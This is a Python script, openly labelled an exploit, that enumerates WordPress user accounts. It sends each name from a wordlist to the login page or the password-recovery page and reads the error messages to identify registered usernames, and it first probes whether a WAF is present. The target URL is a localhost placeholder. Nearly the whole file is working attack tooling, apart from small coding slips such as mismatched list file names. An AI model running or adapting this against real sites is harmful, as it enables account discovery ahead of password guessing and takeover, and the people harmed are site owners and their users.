import requests
from bs4 import BeautifulSoup 

def user_enumeration_login():
    with open('usernames.txt', 'r') as f:
        users_list = f.readlines()
        print ("Running... Please Wait!")
        url = "http://127.0.0.1/wordpress/wp-login.php"
        cookies = {"wordpress_test_cookie": "WP%20Cookie%20check", "wp_lang": "en_US"}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1/wordpress/wp-login.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
        data = {"log": "_______test_________", "pwd": "pass", "wp-submit": "Log In", "redirect_to": "http://127.0.0.1/wordpress/wp-admin/", "testcookie": "1"}
        req = requests.post(url, headers=headers, cookies=cookies, data=data)
        soup = BeautifulSoup(req.content, 'html.parser')
        find_div = soup.find('div', {'id': 'login_error'})
        parse = find_div.text.strip()
    if parse == "ERROR: The username or password you entered is incorrect. Lost your password?":
        print ("This WordPress login page has been altered or protected by a WAF.")
        exit
    else:
        for user in users_list:
            url = "http://127.0.0.1/wordpress/wp-login.php"
            cookies = {"wordpress_test_cookie": "WP%20Cookie%20check", "wp_lang": "en_US"}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1/wordpress/wp-login.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
            data = {"log": user, "pwd": "pass", "wp-submit": "Log In", "redirect_to": "http://127.0.0.1/wordpress/wp-admin/", "testcookie": "1"}
            req = requests.post(url, headers=headers, cookies=cookies, data=data)
            soup = BeautifulSoup(req.content, 'html.parser')
            find_div = soup.find('div', {'id': 'login_error'})
            parse = find_div.text.strip()
            users = user.strip()
            failed_username = "Error: The username {} is not registered on this site. If you are unsure of your username, try your email address instead.".format(users)
            failed_email = "Unknown email address. Check again or try your username.".format(users)
            if failed_username not in parse and failed_email not in parse:
                print ("Found User : " + users)
 
def user_enumeration_recover():
    with open('users.txt', 'r') as f:
        users_list = f.readlines()
        print ("Running... Please Wait!")
        # Verify changes or WAF
        url = "http://127.0.0.1/wp-login.php?action=lostpassword"
        cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1/wordpress/wp-login.php?action=lostpassword", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
        data = {"user_login": "_______test_________", "redirect_to": '', "wp-submit": "Get New Password"}
        req = requests.post(url, headers=headers, cookies=cookies, data=data)
        soup = BeautifulSoup(req.content, 'html.parser')
        find_div = soup.find(id="login-message")
        parse = find_div.get_text(strip=True) if find_div is not None else ""
    if parse == "Check your email for the confirmation link, then visit thelogin page.":
         print ("This WordPress login page has been altered or protected by a WAF.")
         exit
    else:     
        for user in users_list:
            url = "http://127.0.0.1/wordpress/wp-login.php?action=lostpassword"
            cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1/wordpress/wp-login.php?action=lostpassword", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
            data = {"user_login": user, "redirect_to": '', "wp-submit": "Get New Password"}
            req = requests.post(url, headers=headers, cookies=cookies, data=data)
            soup = BeautifulSoup(req.content, 'html.parser')
            find_div = soup.find('div', {'id': 'login_error'})
            parse = find_div.get_text(strip=True)
            users = user.strip()
            if "Error:There is no account with that username or email address." not in parse:
                print ("Found User : " + users)

def main() -> None:
    print ("\n\n W̳o̳r̳d̳P̳r̳e̳s̳s̳ U̳s̳e̳r̳ E̳n̳u̳m̳e̳r̳a̳t̳i̳o̳n̳\n")
    print ('(!) Remember: Edit the exploit URL and create a list called "users.txt" in this folder, including usernames and e-mail addresses.\n')
    print("Menu:")
    print("1. List users using the WordPress login page")
    print("2. List users using the WordPress recover page")
    op = input("-> ")
    if op == "1":
        user_enumeration_login()
    elif op == "2":
        user_enumeration_recover()
    else:
        print("error")

if __name__ == "__main__":
    main()
